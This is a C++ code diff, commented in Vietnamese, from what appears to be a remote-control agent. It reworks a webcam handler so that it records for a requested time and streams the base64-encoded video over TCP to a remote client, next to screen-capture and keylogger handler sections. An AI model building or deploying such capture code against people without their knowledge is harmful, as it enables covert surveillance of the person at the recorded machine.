@@ -78,15 +78,60 @@ json ProcessHandlers::captureScreen(const json &)
 }
 
 // Webcam Record
-// Chưa chỉnh chức năng tinh chỉnh thời gian
-json ProcessHandlers::recordWebcam(const json &req)
+// Biến toàn cục để giữ trạng thái của việc ghi hình, mặc dù
+// WebcamRecord hiện tại là static, chúng ta sẽ cần thay đổi logic
+// để quản lý đa luồng tốt hơn.
+// Tạm thời, chúng ta sẽ sử dụng phương thức static `record_base64` cũ.
+// Gửi trạng thái "started" trước khi bắt đầu ghi hình
+json ProcessHandlers::startWebcamRecord(const json &req)
 {
     int time = req.value("time", 10);
-    std::string b64 = WebcamRecord::record_base64(time);
-    if (b64.empty())
-        return {{"type", "status"}, {"success", false}, {"message", "record failed"}};
+    
+    // Gửi trạng thái STARTED ngay lập tức
+    json status_msg = {
+        {"type", "webcam_recording_status"},
+        {"message", "Recording started. Duration: " + std::to_string(time) + "s"}
+    };
+    AgentTcpServer::instance().sendJson(status_msg);
 
-    return {{"type", "webcam record"}, {"success", true}, {"data", b64}};
+    // Ghi hình và chờ (Blocking call)
+    std::string b64 = WebcamRecord::record_base64(time);
+
+    // Gửi trạng thái COMPLETED/FAILED sau khi kết thúc
+    if (b64.empty()) {
+        json failed_msg = {
+            {"type", "webcam_recording_status"},
+            {"message", "Recording failed"}
+        };
+        AgentTcpServer::instance().sendJson(failed_msg);
+        return {{"type", "status"}, {"success", false}, {"message", "record failed"}};
+    }
+    
+    // Gửi video đã mã hóa
+    json video_msg = {
+        {"type", "webcam_video"}, // Đổi thành webcam_video như Front-end đã xử lý
+        {"success", true},
+        {"data", b64}
+    };
+    // Dùng sendJson của AgentTcpServer để gửi video ngay lập tức
+    AgentTcpServer::instance().sendJson(video_msg);
+
+    // Trả về status thành công, nhưng không có dữ liệu (vì đã gửi riêng)
+    return {{"type", "status"}, {"success", true}, {"message", "Webcam video sent."}};
+}
+
+// Hàm này sẽ không làm gì nhiều với WebcamRecord::record_base64 hiện tại vì nó là blocking.
+// Để có chức năng dừng thực sự, cần thay đổi WebcamRecord để dùng luồng và kiểm soát được.
+json ProcessHandlers::stopWebcamRecord(const json &)
+{
+    // Tạm thời, chỉ gửi trạng thái hủy bỏ về client.
+    // Logic dừng thực sự (kill FFmpeg thread) sẽ cần thay đổi WebcamRecord.cpp
+    json status_msg = {
+        {"type", "webcam_recording_status"},
+        {"message", "Recording cancelled (client request)"}
+    };
+    AgentTcpServer::instance().sendJson(status_msg);
+    return {{"type", "status"}, {"success", true}, {"message", "Webcam stop signal sent."}};
 }
 
 // === KEYLOGGER HANDLERS ===
